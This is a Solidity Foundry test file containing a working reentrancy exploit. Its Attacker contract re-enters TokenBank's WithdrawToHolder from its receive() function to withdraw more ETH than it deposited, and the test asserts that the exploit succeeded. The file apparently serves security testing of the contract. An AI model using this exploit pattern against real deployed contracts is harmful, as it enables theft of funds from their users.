
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TokenBank} from "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    TokenBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _contractUnderTest.initTokenBank();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1.1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to have a deposit in the Holders mapping
        // and be the owner to call WithdrawToHolder

        // --- 3. Funding ---
        // Fund the victim contract (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        // Transfer ownership to the attacker so it can call WithdrawToHolder
        _contractUnderTest.changeOwner(address(_attacker));
        
        // Setup attack - attacker confirms ownership and makes deposit
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Execute the attack
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) {
        victim = TokenBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        // Confirm ownership transfer
        victim.confirmOwner();
        
        // Make a deposit to be registered in Holders mapping
        victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialSnapshot = address(this).balance;
        
        // 2. Store the value for the re-entrant call
        storedVal = val;
        
        // 3. Call the vulnerable function
        // WithdrawToHolder sends ETH before updating state
        victim.WithdrawToHolder(address(this), val);
        
        // 4. Verify Success Conditions
        // If attackCallCount > 1, reentrancy occurred
        // If we received more than we should have, exploit succeeded
        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter the vulnerable function
            // The Holders[address(this)] hasn't been decremented yet
            // so we can withdraw again
            victim.WithdrawToHolder(address(this), storedVal);
        }
    }
}
